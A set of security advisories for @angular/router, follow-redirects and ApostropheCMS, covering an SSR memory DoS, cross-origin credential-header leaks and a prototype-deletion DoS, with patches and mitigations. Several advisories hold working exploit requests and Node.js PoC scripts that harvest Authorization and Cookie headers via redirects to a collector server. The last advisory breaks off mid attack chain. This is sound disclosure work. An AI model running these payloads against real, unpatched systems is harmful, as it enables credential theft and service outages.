### GHSA-57xq-rjx2-v5xh — @angular/router: Denial of Service via RouterLink Query Parameter Retention in Server-Side Rendering (SSR)
- Aliases: CVE-2026-111751 | Published: 2026-10-20 | Modified: 2026-10-20 | Severity: HIGH
- CWE: CWE-400, CWE-770
- CVSS_V4: `CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N`
- Affected npm/@angular/router: introduced:22.0.0 fixed:22.2.1
- Affected npm/@angular/router: introduced:21.2.0 fixed:21.2.25

A denial of service (DoS) vulnerability was identified in `@angular/router` when Server-Side Rendering (SSR) is enabled on Node.js (V8) and `RouterLink` directives are rendered with `queryParamsHandling: 'merge'` or `'preserve'`, configured either per link or globally via `defaultQueryParamsHandling`.

Starting in v21.2.0 ([angular/angular#66181](https://github.com/angular/angular/pull/66181)), `RouterLink` internals were refactored to use signals, introducing a computed signal (`_urlTree`) that cached the returned `UrlTree` instance on the directive. Because each rendered link maintains an active `RouterLink` instance for the entire duration of the request lifecycle, the computed signal permanently pinned the `UrlTree` and its associated query parameter dictionary in the heap until the SSR response completed.

When query parameter handling is set to `'merge'` or `'preserve'`, each link copies the incoming request's query parameters into its own `UrlTree`. During SSR, memory consumption scales multiplicatively:

$$\text{Heap Retention} \approx (\text{Number of affected links}) \times (\text{Size of parsed query parameter map})$$

Because parsed JavaScript objects and property dictionaries require substantially more heap space than the raw query string—particularly when property names trigger dense array allocations under V8 property-storage heuristics—an attacker can supply oversized query strings to amplify heap consumption by orders of magnitude per in-flight request.

### Impact

Successful exploitation allows an unauthenticated remote attacker to exhaust the Node.js old-space heap with modest concurrent request volume, terminating the SSR worker with an unrecoverable JavaScript heap out of memory fatal crash.

* **Numeric Names Not Required:** Numeric query parameter names trigger larger V8 property-storage allocations (~558 KB per parsed dictionary in tests vs. ~197 KB for non-numeric equivalents), lowering the concurrency threshold needed for a crash. However, non-numeric query parameters also produce significant heap amplification and can exhaust worker memory with proportionally higher concurrency.
* **Client-side SPAs Unaffected:** Pure client-side Angular applications (Single Page Applications without SSR) are not vulnerable, as local browser memory consumption does not cross a security boundary.

### Attack Preconditions & Vulnerable Configurations

An application is affected only if all of the following conditions are met:

1. **SSR Enabled:** The application runs in a Server-Side Rendering environment powered by Node.js / V8.
2. **Merged or Preserved Query Parameters:** `RouterLink` elements rendered during SSR use `queryParamsHandling: 'merge'` or `'preserve'`, either bound explicitly on links or configured application-wide via `withRouterConfig({ defaultQueryParamsHandling: 'merge' })`.
3. **Upstream Proxy Forwards Long Request Lines:** Reverse proxies or load balancers (e.g., Nginx, AWS ALB, Cloudflare) forward long query strings to the Node.js application rather than rejecting them at the edge. (For example, Nginx's default 8 KB `large_client_header_buffers` limit rejects 16 KB request lines unless explicitly increased).
4. **Overlapping Renders:** Because retained memory is freed once each request completes, multiple concurrent requests must be processed simultaneously in the same Node.js worker instance (such as pages awaiting asynchronous data fetching, route resolvers, or external API calls during SSR).

### Exploit Payload Example

An attacker issues concurrent HTTP requests containing dense query parameters to an SSR page that renders multiple merged links:

```http
GET /products?0&17&34&51&68&85&...&48042 HTTP/1.1
Host: example.com
```

### Patches

The issue is resolved by removing persistent `UrlTree` retention from `RouterLink` ([angular/angular#70953](https://github.com/angular/angular/pull/70953)). `RouterLink` now tracks route dependencies directly in `reactiveHref` and discards intermediate `UrlTree` instances immediately after computing the serialized href string. The `urlTree` getter and click handlers compute `UrlTree` instances on demand.

As a result, intermediate query parameter maps are short-lived allocations collected during young-generation GC scavenges rather than remaining pinned in the heap for the lifetime of the request, restoring the memory profile of Angular 21.1 and earlier.

Patched versions:
* `22.2.1`
* `21.2.25`

Versions prior to 21.2.0 (including Angular 20.x LTS and 21.1.x) do not retain `UrlTree` instances in `RouterLink` and are not vulnerable to this issue.

### Workarounds & Mitigations

If you cannot immediately upgrade to a patched version, apply one or more of the following mitigations:

1. **Avoid 'merge' and 'preserve' on Server-Rendered Links:**
   Remove `defaultQueryParamsHandling: 'merge'` (or `'preserve'`) from global configuration. Explicitly bind only the specific query parameters each link requires (e.g., `[queryParams]="{ filter: filter() }"`). Even on patched versions, this practice prevents unnecessary request-derived parameter propagation into generated DOM markup.

2. **Limit Query String Length at Reverse Proxy or Middleware:**
   Configure your edge proxy, web application firewall (WAF), or reverse proxy to reject requests with excessively long query strings (e.g., exceeding 2,048 bytes).

   Alternatively, reject oversized query strings in Node.js before Angular SSR handles the request:
   ```ts
   // server.ts (before Angular SSR handler)
   app.use((req, res, next) => {
     const queryIndex = req.url.indexOf('?');
     if (queryIndex !== -1 && req.url.length - queryIndex > 2048) {
       res.status(414).send('URI Too Long');
       return;
     }
     next();
   });
   ```

3. **Increase Node.js Old Space:**
   Increasing `--max-old-space-size` (e.g., to 2048 MB or 4096 MB) increases the memory headroom and the concurrency threshold required to exhaust memory, though it does not fully eliminate vulnerability under sustained traffic.

References:
- https://github.com/angular/angular/security/advisories/GHSA-57xq-rjx2-v5xh [WEB]
- https://github.com/angular/angular/issues/70908 [WEB]
- https://github.com/angular/angular/pull/70953 [WEB]
- https://github.com/angular/angular/commit/319a3c4f3268f4f96ac4acdbb118737d2261e0be [WEB]
- https://github.com/angular/angular [PACKAGE]

### GHSA-8r9p-f939-6h3c — follow-redirects sensitiveHeaders regex escaping can expose credential headers
- Aliases: CVE-2026-111755 | Published: 2026-10-20 | Modified: 2026-10-20 | Severity: HIGH
- CWE: CWE-185, CWE-200
- CVSS_V4: `CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N`
- Affected npm/follow-redirects: introduced:1.16.0 fixed:1.16.1

### Summary
follow-redirects 1.16.0 introduced the `sensitiveHeaders` option (the fix for CVE-2026-40895 / GHSA-r4q5-vmmm-2653), which lets an application declare extra header names that must be removed when a redirect crosses to a different host or downgrades protocol. The filter is a single case-insensitive regular expression built by concatenating the declared header names into an alternation after passing each through `escapeRegex`. `escapeRegex` escapes only a partial set of metacharacters and leaves `^`, `|`, `[`, `{`, and `}` unescaped. Header names may legitimately contain `^` and `|` (both are valid RFC 9110 token characters that Node accepts and sends), and for a declared name containing either, the generated pattern can never match the intended header. As a result, an application that adopts this option to protect a custom credential header, then follows an attacker-controlled cross-origin redirect, forwards that credential to the attacker with no error or warning, while believing it is protected. The failure is silent: the protection simply does not exist for the affected names. The built-in list (Authorization, Proxy-Authorization, Cookie) contains no metacharacters and is not affected by this defect.

### Details
The filter is constructed once, in the `RedirectableRequest` constructor at `index.js:118-120`:

```js
this._headerFilter = new RegExp("^(?:" +
    sensitiveHeaders.concat(options.sensitiveHeaders).map(escapeRegex).join("|") +
  ")$", "i");
```

`escapeRegex` at `index.js:703-705`:

```js
function escapeRegex(regex) {
  return regex.replace(/[\]\\/()*+?.$]/g, "\\$&");   // escapes ] \ / ( ) * + ? . $  -- NOT ^ | [ { }
}
```

The character class escapes `]`, `\`, `/`, `(`, `)`, `*`, `+`, `?`, `.`, and `$`. It omits `^`, `|`, `[`, `{`, and `}`. Of these, Node's `http.ClientRequest` accepts `^` and `|` in header names (they are valid `tchar` values under RFC 9110) and rejects `[`, `{`, `}` with `ERR_INVALID_HTTP_TOKEN`, so `^` and `|` are the reachable vectors for a silent credential leak. Separately, although `[`, `{`, `}` cannot appear as live header names, declaring a `sensitiveHeaders` entry that contains one of them injects an unbalanced token into the alternation (for example an unterminated character class), so the filter `RegExp` throws a `SyntaxError` in the `RedirectableRequest` constructor and the request fails to start. That case is a loud request-time crash from the same incomplete-escaping root cause rather than a silent bypass, and the canonical escaper below fixes it as well.

For a declared sensitive header name containing an unescaped metacharacter, the alternation is broken in a fail-open way:

- A name containing `^`, for example `X-Api^Key`, yields the alternative `X-Api^Key` inside the pattern. The `^` becomes a mid-pattern start-of-string anchor, so the alternative can never match any real header name. `test("X-Api^Key")` returns `false`, and the header is not stripped.
- A name containing `|`, for example `X-Token|Secret`, is split into two separate alternatives `X-Token` and `Secret`. The real header `X-Token|Secret` is never matched (not stripped), while unrelated headers literally named `X-Token` or `Secret` would be stripped instead.

The generated filter source, reproduced from the exact library logic, is:
```
^(?:Authorization|Proxy-Authorization|Cookie|X-Api^Key|X-Token|Secret|X-Control-Key)$
```
Direct matching results against this filter: `X-Api^Key` -> false, `X-Token|Secret` -> false, `X-Control-Key` (normal name) -> true, and the split-off `X-Token` -> true and `Secret` -> true (collateral wrong-stripping). The built-ins Authorization, Proxy-Authorization, Cookie all -> true.

Secondary, related weakness (filter snapshot not refreshed after `beforeRedirect`): the filter is built once at construction and applied at `index.js:490`, which runs before the `beforeRedirect(this._options, ...)` hook and the subsequent `_sanitizeOptions` at `index.js:494-506`. Because the strip happens before the hook and `this._headerFilter` is never rebuilt, any entry a caller adds to `options.sensitiveHeaders` inside `beforeRedirect` is silently ignored. This facet is lower severity: mutating `sensitiveHeaders` inside `beforeRedirect` is not a documented usage of the option (the documented path is the request option), so it is best treated as a hardening item bundled with the escaping fix rather than an independent control bypass. It is included here because both issues undermine the same control and share a remediation.

Suggested remediation: two changes close both facets.

1. Escape the complete set of regular-expression metacharacters:
```js
function escapeRegex(str) { return str.replace(/[.*+?^${}()|[\]\\]/g, "\\$&"); }
```
This was verified to restore correct matching for all affected names while preserving the built-in matches.

2. Build the filter at strip time, or rebuild it after the `beforeRedirect` hook re-sanitizes options, so entries added inside the hook take effect. For example, replace the cached `this._headerFilter` with a `this._getHeaderFilter()` that constructs the RegExp from the current `this._options.sensitiveHeaders` on each redirect.

Additionally, since header names have a strict grammar, consider validating each entry of `options.sensitiveHeaders` against the RFC 9110 token character set and throwing an explicit error on invalid names, so misconfiguration fails loudly. Add a unit test asserting that every declared name is actually matched by the generated filter; the current suite only exercises metacharacter-free names (`Sensitive-A`, `x-sensitive-b`), which is why the defect passes CI.

References:
- https://github.com/follow-redirects/follow-redirects/security/advisories/GHSA-r4q5-vmmm-2653
- https://github.com/follow-redirects/follow-redirects/pull/284
- https://github.com/follow-redirects/follow-redirects/commit/844c4d302ac963d29bdb5dc1754ec7df3d70d7f9

### PoC
Environment: Node.js v24.18.0 on Windows 11. Run each script from a checkout of follow-redirects at 1.16.0 so that `require("./index.js")` resolves to the library under test.

Facet 1, metacharacter header names, `leak.js`:
```js
var followRedirects = require("./index.js");
var http = require("http");
var redirector = http.createServer(function (req, res) {
  req.resume();
  res.writeHead(302, { Location: "http://127.0.0.1:45902/" });   // cross-origin (different port)
  res.end();
});
var collector = http.createServer(function (req, res) {
  res.end(JSON.stringify(req.headers));                          // attacker-controlled target
});
redirector.listen(45901, "127.0.0.1", function () {
  collector.listen(45902, "127.0.0.1", function () {
    followRedirects.http.request({
      hostname: "127.0.0.1", port: 45901, path: "/",
      headers: {
        "X-Api^Key":      "SECRET-LEAKED-1",     // declared sensitive, name contains ^
        "X-Token|Secret": "SECRET-LEAKED-2",     // declared sensitive, name contains |
        "X-Control-Key":  "SHOULD-BE-STRIPPED",  // declared sensitive, normal name (control)
        "Authorization":  "Bearer BUILTIN-CTL"   // built-in list (control)
      },
      sensitiveHeaders: ["X-Api^Key", "X-Token|Secret", "X-Control-Key"]
    }, function (res) {
      var body = ""; res.on("data", function (c) { body += c; });
      res.on("end", function () {
        var h = JSON.parse(body);
        console.log("X-Api^Key      :", h["x-api^key"] || "(stripped)");
        console.log("X-Token|Secret :", h["x-token|secret"] || "(stripped)");
        console.log("X-Control-Key  :", h["x-control-key"] || "(stripped - OK)");
        console.log("Authorization  :", h["authorization"] || "(stripped - OK)");
        redirector.close(); collector.close();
      });
    }).end();
  });
});
```
Observed output (1.16.0):
```
X-Api^Key      : SECRET-LEAKED-1          <- credential LEAKED to redirect target
X-Token|Secret : SECRET-LEAKED-2          <- credential LEAKED to redirect target
X-Control-Key  : (stripped - OK)          <- control: option works for normal names
Authorization  : (stripped - OK)          <- control: built-in list works
```
The two controls stripping correctly in the same run prove the strip branch executed and only the metacharacter names defeat the filter.

Root-cause and fix verification (pure regex logic, no network):
```js
var builtin = ["Authorization", "Proxy-Authorization", "Cookie"];
function escCurrent(s) { return s.replace(/[\]\\/()*+?.$]/g, "\\$&"); }         // library's escaper
function escFixed(s)   { return s.replace(/[.*+?^${}()|[\]\\]/g, "\\$&"); }      // canonical escaper
function build(esc, d) { return new RegExp("^(?:" + builtin.concat(d).map(esc).join("|") + ")$", "i"); }
var declared = ["X-Api^Key", "X-Token|Secret", "X-Control-Key"];
var cur = build(escCurrent, declared), fix = build(escFixed, declared);
["X-Api^Key","X-Token|Secret"].forEach(n => console.log("current", n, cur.test(n)));  // both false
["X-Api^Key","X-Token|Secret"].forEach(n => console.log("fixed  ", n, fix.test(n)));  // both true
["X-Token","Secret"].forEach(n => console.log("collateral", n, cur.test(n)));         // both true (wrong)
```
Observed: current filter returns false for both metacharacter names and true for the unrelated `X-Token` and `Secret`; the fixed filter returns true for all declared names and still true for the built-ins.

Reachability of the vectors:
```
node -e 'var http=require("http");["X-A^B","X-A|B","X-A[B","X-A{B","X-A}B"].forEach(function(n){try{var r=http.request({host:"127.0.0.1",port:1});r.setHeader(n,"v");r.destroy();console.log(n,"ACCEPTED");}catch(e){console.log(n,"REJECTED",e.code);}});'
```
Observed: `X-A^B` and `X-A|B` ACCEPTED; `X-A[B`, `X-A{B`, `X-A}B` REJECTED with `ERR_INVALID_HTTP_TOKEN`.

Facet 2, entry declared inside `beforeRedirect`, `leak2.js`:
```js
var followRedirects = require("./index.js");
var http = require("http");
var redirector = http.createServer(function (req, res) {
  res.writeHead(302, { Location: "http://127.0.0.1:46202/" }); res.end();
});
var collector = http.createServer(function (req, res) { res.end(JSON.stringify(req.headers)); });
redirector.listen(46201, "127.0.0.1", function () {
  collector.listen(46202, "127.0.0.1", function () {
    followRedirects.http.request({
      hostname: "127.0.0.1", port: 46201, path: "/",
      headers: { "X-Late": "LATE-DECLARED-VALUE" },
      beforeRedirect: function (options) { options.sensitiveHeaders.push("X-Late"); }
    }, function (res) {
      var body = ""; res.on("data", function (c) { body += c; }); res.on("end", function () {
        console.log("X-Late forwarded to redirect target:", JSON.parse(body)["x-late"] || "(stripped)");
        redirector.close(); collector.close();
      });
    }).end();
  });
});
```
Observed output (1.16.0): `X-Late forwarded to redirect target: LATE-DECLARED-VALUE` (the late-declared name is not stripped).

### Impact
This is an information-disclosure vulnerability: silent failure of the `sensitiveHeaders` cross-origin stripping control for affected header names. Who is impacted: any application, or upstream library, that adopts the `sensitiveHeaders` option to protect a custom credential-bearing header whose name contains `^` or `|`, and that follows a redirect controlled or compromised by an attacker. When triggered, the declared header value (typically an API token or other bearer credential) is disclosed to the attacker-controlled destination, silently, while the application believes the header is protected. As with the array-form finding, if the redirect downgrades HTTPS to HTTP, the credential also transits in cleartext. Downstream exposure extends beyond the library: any application or wrapper that adopts the `sensitiveHeaders` option and declares a metacharacter-bearing header name inherits the same silent bypass. axios delegates redirect handling to follow-redirects (see GHSA-r4q5-vmmm-2653), so axios-based stacks are affected wherever this option reaches the library. The built-in protected headers are unaffected.

### GHSA-q3jh-wrc6-jgq8 — follow-redirects array-form headers bypass cross-origin credential stripping
- Aliases: CVE-2026-111756 | Published: 2026-10-20 | Modified: 2026-10-20 | Severity: HIGH
- CWE: CWE-200, CWE-212
- CVSS_V4: `CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N`
- Affected npm/follow-redirects: introduced:1.16.0 fixed:1.16.1

### Summary
follow-redirects removes sensitive credential headers (Authorization, Proxy-Authorization, Cookie, and any caller-declared `sensitiveHeaders`) before following a redirect that crosses to a different host or downgrades to a less secure protocol. The removal routine iterates the caller's headers container with `for...in` and matches header names against a filter. This assumes the headers container is a plain object keyed by header names. Node's underlying `http.request`, which follow-redirects is a drop-in replacement for, also accepts headers as an alternating array of names and values. For an array, `for...in` yields the numeric indices `"0"`, `"1"`, `"2"` and so on, which never match a header-name filter, so nothing is removed. An application that sends array-form headers and follows an attacker-controlled cross-origin redirect therefore forwards its Authorization, Cookie, and Proxy-Authorization headers verbatim to the attacker-controlled destination, with no error or warning. The `sensitiveHeaders` option added to fix CVE-2026-40895 / GHSA-r4q5-vmmm-2653 is equally ineffective, because it relies on the same helper. This is an unauthenticated confidentiality vulnerability: any remote server the victim application contacts can harvest the victim's credential headers by responding with a cross-origin redirect.

### Details
The cross-origin credential-stripping control is implemented by `removeMatchingHeaders(regex, headers)` at `index.js:630-640`:

```js
function removeMatchingHeaders(regex, headers) {
  var lastValue;
  for (var header in headers) {          // for...in over an ARRAY yields "0","1","2"...
    if (regex.test(header)) {            // the header-name filter never matches a numeric index
      lastValue = headers[header];
      delete headers[header];
    }
  }
  return (lastValue === null || typeof lastValue === "undefined") ?
    undefined : String(lastValue).trim();
}
```

It is invoked from `_processResponse` for three purposes, all with the caller-supplied `this._options.headers`:

- `index.js:490` - strip the credential filter (`this._headerFilter`, which covers the built-in list Authorization/Proxy-Authorization/Cookie plus any `sensitiveHeaders`) when the redirect crosses origin or downgrades protocol.
- `index.js:470` - strip the `Host` header (`/^host$/i`).
- `index.js:466` - strip `content-*` headers when a 301/302/303 converts POST to GET.

The caller-supplied headers container is passed straight through to each redirected request via `nativeProtocol.request(this._options)` at `index.js:352`. `_sanitizeOptions` (index.js:300-331) only replaces `options.headers` when it is falsy, so an array is left untouched.

Node's `http.request` accepts `options.headers` as an alternating array of names and values (for example `["Authorization", "Bearer ...", "Cookie", "session=..."]`). This is a supported way to control header ordering and duplication. For such an array, `for (var header in headers)` iterates the numeric indices `"0"`, `"1"`, `"2"`, and the header-name regex never matches any of them, so `removeMatchingHeaders` deletes nothing. Every one of the three strip operations above silently no-ops:

- The built-in credential headers (Authorization, Cookie, Proxy-Authorization) are forwarded to the cross-origin redirect target.
- Any `sensitiveHeaders` the caller declared are forwarded too.
- The stale `Host` of the previous origin is re-sent to the new origin.
- On a POST-to-GET redirect the `content-*` headers are retained, leaving `Content-Length` inconsistent with the now-empty body.

The primary and highest-impact consequence is disclosure of credential headers. The stale `Host` re-send and the `Content-Length` inconsistency are secondary correctness defects arising from the same root cause.

Root-cause history: the `for...in`-based `removeMatchingHeaders` used for the built-in credential strip has been present since the cross-host Authorization drop was introduced (commit `724087d`, first released in v1.11.0) and is unchanged through 1.16.0. The `sensitiveHeaders` layer was introduced in 1.16.0 (commit `844c4d3`). The behavior was verified directly on both 1.15.11 and 1.16.0.

Suggested remediation: handle or explicitly reject Node's array-form headers. The strictest fix is to detect `Array.isArray(options.headers)` in `_sanitizeOptions` and throw a clear `TypeError` instructing callers to pass an object, so misuse fails loudly instead of silently downgrading security. If array support is desired, extend `removeMatchingHeaders` to walk the array in name/value pairs:

```js
function removeMatchingHeaders(regex, headers) {
  if (Array.isArray(headers)) {
    var lastValue;
    for (var i = 0; i < headers.length; i += 2) {
      if (regex.test(headers[i])) { lastValue = headers[i + 1]; headers.splice(i, 2); i -= 2; }
    }
    return (lastValue === null || typeof lastValue === "undefined") ? undefined : String(lastValue).trim();
  }
  // existing object logic
}
```

Apply the same guard to the `Host` and `content-*` removal paths. Add regression tests that exercise array-form headers across a cross-origin redirect; the current suite only covers object-form headers.

References:
- https://github.com/follow-redirects/follow-redirects/security/advisories/GHSA-r4q5-vmmm-2653
- https://github.com/follow-redirects/follow-redirects/commit/724087d696c0bcd55c13ee0f3560c4558138e422
- https://github.com/follow-redirects/follow-redirects/commit/844c4d3 (sensitiveHeaders option)

### PoC
Environment: Node.js v24.18.0 on Windows 11. The underlying Node array-header behavior is long-standing and not version-specific. Run each script from a checkout of follow-redirects at 1.16.0 so that `require("./index.js")` resolves to the library under test.

Precondition check (Node accepts and serializes array-form headers):
```
node -e 'var http=require("http");var s=http.createServer((q,r)=>r.end(JSON.stringify(q.headers)));s.listen(0,"127.0.0.1",()=>{var p=s.address().port;http.request({hostname:"127.0.0.1",port:p,headers:["Authorization","Bearer T","Cookie","c=1"]},res=>{var b="";res.on("data",c=>b+=c);res.on("end",()=>{console.log(JSON.parse(b).authorization, JSON.parse(b).cookie);s.close();});}).end();});'
```
Observed: `Bearer T c=1` (the server receives both headers, confirming array form is valid and delivered).

Minimal form (built-in credential list), `arrayleak.js`:
```js
var followRedirects = require("./index.js");
var http = require("http");
var redirector = http.createServer(function (req, res) {
  req.resume();
  res.writeHead(302, { Location: "http://127.0.0.1:47302/steal" });   // cross-origin (different port)
  res.end();
});
var collector = http.createServer(function (req, res) {
  res.end(JSON.stringify(req.headers));                                // attacker-controlled target
});
redirector.listen(47301, "127.0.0.1", function () {
  collector.listen(47302, "127.0.0.1", function () {
    followRedirects.http.request({
      hostname: "127.0.0.1", port: 47301, path: "/", method: "GET",
      headers: [
        "Host", "127.0.0.1:47301",
        "Authorization", "Bearer ARRAY-FORM-VICTIM-TOKEN",
        "Cookie", "session=ARRAY-FORM-SESSION-ID",
        "X-Custom", "harmless"
      ]
    }, function (res) {
      var body = ""; res.on("data", function (c) { body += c; });
      res.on("end", function () {
        var h = JSON.parse(body);
        console.log("Authorization :", h.authorization || "(stripped - OK)");
        console.log("Cookie        :", h.cookie || "(stripped - OK)");
        redirector.close(); collector.close();
      });
    }).end();
  });
});
```
Observed output (1.16.0 and 1.15.11):
```
Authorization : Bearer ARRAY-FORM-VICTIM-TOKEN     <- credential LEAKED cross-origin
Cookie        : session=ARRAY-FORM-SESSION-ID      <- credential LEAKED cross-origin
```
Control: replacing `headers` with the equivalent object `{ Host: ..., Authorization: ..., Cookie: ... }` and re-running strips both correctly, proving the strip branch executes and only the array iteration defeats it.

Combined form (built-in list plus the 1.16.0 `sensitiveHeaders` fix, all defeated in one request), `combined.js`:
```js
var followRedirects = require("./index.js");
var http = require("http");
var redirector = http.createServer(function (req, res) {
  req.resume();
  res.writeHead(302, { Location: "http://127.0.0.1:47402/steal" });
  res.end();
});
var collector = http.createServer(function (req, res) { res.end(JSON.stringify(req.headers)); });
redirector.listen(47401, "127.0.0.1", function () {
  collector.listen(47402, "127.0.0.1", function () {
    followRedirects.http.request({
      hostname: "127.0.0.1", port: 47401, path: "/", method: "GET",
      headers: [
        "Host", "127.0.0.1:47401",
        "Authorization", "Bearer BUILTIN-VICTIM-TOKEN",
        "Cookie", "session=BUILTIN-SESSION-ID",
        "X-API-Key", "DECLARED-VICTIM-KEY"
      ],
      sensitiveHeaders: ["X-API-Key"]
    }, function (res) {
      var body = ""; res.on("data", function (c) { body += c; }); res.on("end", function () {
        var h = JSON.parse(body);
        console.log("Authorization (built-in list) :", h.authorization || "(stripped - OK)");
        console.log("Cookie (built-in list)        :", h.cookie || "(stripped - OK)");
        console.log("X-API-Key (sensitiveHeaders)  :", h["x-api-key"] || "(stripped - OK)");
        redirector.close(); collector.close();
      });
    }).end();
  });
});
```
Observed output (1.16.0):
```
Authorization (built-in list) : Bearer BUILTIN-VICTIM-TOKEN     <- LEAKED
Cookie (built-in list)        : session=BUILTIN-SESSION-ID      <- LEAKED
X-API-Key (sensitiveHeaders)  : DECLARED-VICTIM-KEY             <- LEAKED (the CVE-2026-40895 fix defeated)
```

Protocol-downgrade branch (credentials transit in cleartext), `downgrade.js`, using the repository's own test certificate at `test/assets/`:
```js
var followRedirects = require("./index.js");
var http = require("http"); var https = require("https"); var fs = require("fs");
var opts = { key: fs.readFileSync("test/assets/localhost.key"), cert: fs.readFileSync("test/assets/localhost.crt") };
var ca = fs.readFileSync("test/assets/ca.crt");
var httpsOrigin = https.createServer(opts, function (req, res) {
  req.resume(); res.writeHead(302, { Location: "http://localhost:47502/steal" }); res.end();
});
var httpCollector = http.createServer(function (req, res) { res.end(JSON.stringify(req.headers)); });
httpsOrigin.listen(47501, "localhost", function () {
  httpCollector.listen(47502, "localhost", function () {
    followRedirects.https.request({
      hostname: "localhost", port: 47501, path: "/", method: "GET", ca: ca,
      headers: ["Host", "localhost:47501", "Authorization", "Bearer DOWNGRADE-TOKEN", "Cookie", "session=DOWNGRADE-SESSION"]
    }, function (res) {
      var body = ""; res.on("data", function (c) { body += c; });
      res.on("end", function () {
        var h = JSON.parse(body);
        console.log("Authorization :", h.authorization || "(stripped - OK)");
        console.log("Cookie        :", h.cookie || "(stripped - OK)");
        httpsOrigin.close(); httpCollector.close();
      });
    }).end();
  });
});
```
Observed output (1.16.0): both credentials received at the plaintext HTTP target after an HTTPS-to-HTTP redirect, meaning they transit unencrypted and are harvestable by any on-path network observer, not only the redirect destination.

Side-effect verification (stale Host re-sent, Content-Length inconsistent): a POST request with array-form headers and a 13-byte body that receives a 302 to a different origin was observed to arrive at the new origin as a GET carrying the stale `Host` of the first origin and `Content-Length: 13` despite an empty body.

### Impact
This is an information-disclosure vulnerability: silent failure of the cross-origin credential-header stripping control. Who is impacted: any application, or upstream library, that calls follow-redirects with Node's array-form headers (used to control header ordering or duplication) and follows a redirect whose target is controlled or compromised by an attacker. When triggered, the victim's Authorization, Cookie, and Proxy-Authorization headers, and any headers declared through the `sensitiveHeaders` option, are disclosed to the attacker-controlled destination. In the protocol-downgrade case the credentials additionally traverse the network in cleartext, exposing them to on-path observers. No authentication or user interaction is required of the attacker beyond controlling a redirect target the victim already contacts. The control that is defeated is the same one that prior advisories in this library (CVE-2022-0155, CVE-2022-0536, CVE-2026-40895 / GHSA-r4q5-vmmm-2653) were issued to establish and harden.

- https://github.com/follow-redirects/follow-redirects [PACKAGE]
- https://github.com/follow-redirects/follow-redirects/releases/tag/v1.16.1 [WEB]

### GHSA-j5rq-xfvr-p969 — ApostropheCMS: Authenticated projection-exclusion prototype-member deletion in @apostrophecms/db-connect causes process-wide denial of service
- Aliases: CVE-2026-113666 | Published: 2026-10-20 | Modified: 2026-10-20 | Severity: HIGH
- CWE: CWE-1321, CWE-400
- CVSS_V3: `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:H`
- Affected npm/@apostrophecms/db-connect: introduced:0 fixed:1.1.0
- Affected npm/apostrophe: introduced:0 fixed:4.33.0

## Summary

`@apostrophecms/db-connect` ships an in-memory MongoDB emulation used by its SQLite, PostgreSQL, and multipostgres adapters. Its `unsetNestedField` helper walks an attacker-controlled dotted field path with no segment validation and calls `delete` on the resolved property. A low-privileged authenticated user (any role holding `view-draft`, which every editor and contributor has; reduced to any logged-in user when `guestApiAccess` is enabled) can send a piece-type REST GET request whose `project` query builder contains an exclusion key such as `constructor.prototype.hasOwnProperty`. On a SQLite or PostgreSQL adapter this key reaches `unsetNestedField`, which resolves `Object.prototype` and deletes a shared runtime method. Because that method is shared across the whole Node process, the deletion breaks request handling for every tenant and user until the process is restarted, giving a single request a persistent denial of service.

## Root Cause

The projection query builder laundens only projection values, never projection keys, so an arbitrary dotted key survives to the database layer. On the SQLite and PostgreSQL adapters an exclusion projection is applied in JavaScript by `applyProjection`, which for each excluded field calls `unsetNestedField(result, field)`. `unsetNestedField` splits the field on `.` and walks the resulting segments with no guard: unlike its sibling `setNestedField`, it does not even block a literal `__proto__`, and neither helper blocks `constructor` or `prototype`. Because the working object is a plain object produced by `JSON.parse(JSON.stringify(doc))`, its `constructor` resolves to the global `Object`, so a path of `constructor.prototype.<member>` reaches the shared `Object.prototype` and deletes a core, configurable method. The violated invariant is that untrusted input must never be able to traverse into and mutate shared prototype objects.

```text
Affected functions (repository-relative paths):
- unsetNestedField  packages/db-connect/lib/shared.js:119-129  (no segment guard; delete on resolved property)
- applyProjection   packages/db-connect/lib/shared.js:164-216  (exclusion branch calls unsetNestedField per excluded key)
Reachability driver (consumer on a SQL adapter):
- project.launder / project.finalize  packages/apostrophe/modules/@apostrophecms/doc-type/index.js:2003-2103
- getRestQuery                        packages/apostrophe/modules/@apostrophecms/piece-type/index.js:1139-1157
- SQLite adapter applyProjection call packages/db-connect/adapters/sqlite.js:906,980
```

## Impact

Prerequisites: an authenticated account holding `view-draft` (every editing role; any logged-in user when `guestApiAccess: true`), and a consumer configured to use a SQLite, PostgreSQL, or multipostgres adapter. The default `mongodb` adapter hands the projection to the real MongoDB driver and is not affected. With those conditions, a single crafted GET request deletes an attacker-chosen shared prototype method (for example `Object.prototype.hasOwnProperty`, `toString`, or an `Array.prototype` member). The demonstrated capability is a persistent, process-wide denial of service: after the deletion, ordinary calls such as `obj.hasOwnProperty(...)` throw across Apostrophe, its dependencies, and the database driver, so the affected Node process cannot service requests for any user until it is restarted. The attacker chooses which member to remove, and the corruption of shared runtime state persists for the life of the process.

## Proof of Concept

`The finding was reproduced by executing the shipped helper directly against the published db-connect source; a live consumer requires a SQLite or PostgreSQL adapter, an authenticated view-draft session, and at least one matching document.`

1. Authenticate as any user with `view-draft` on a site whose database adapter is `sqlite`, `postgres`, or `multipostgres`.
2. Issue a piece-type REST read with an exclusion projection whose key targets a shared prototype method.
3. Observe that subsequent requests fail process-wide because the shared method was deleted.

```text
GET /api/v1/@apostrophecms/article?project[constructor.prototype.hasOwnProperty]=0
Cookie: <authenticated view-draft session>
```

```text
safe        benign exclusion {title:0} leaves Object.prototype.hasOwnProperty intact
VULNERABLE  exclusion projection deleted Object.prototype.hasOwnProperty (callableBefore=true, brokeEveryObject=true)
VULNERABLE  exclusion projection deleted an arbitrary Object.prototype method (__pocMarker)
```

## Attack Chain

1. **Exposure:** An authenticated `view-draft` user calls the piece-type REST GET endpoint `GET /api/v1/@apostrophecms/<piece-type>`, which is reachable by any editing role.
2. **Control:** The query string `project[constructor.prototype.hasOwnProperty]=0` is parsed by `qs` (with `allowDots` off) into a single own key with literal dots, `{ 'constructor.prototype.hasOwnProperty': '0' }`.
3. **Path:** `getRestQuery` applies the query builders first; `project.launder` copies the key verbatim and coerces only the value to `false`; `project.finalize` skips the falsy value with `if (!val) continue` and preserves the key; the cursor stores it as the projection.
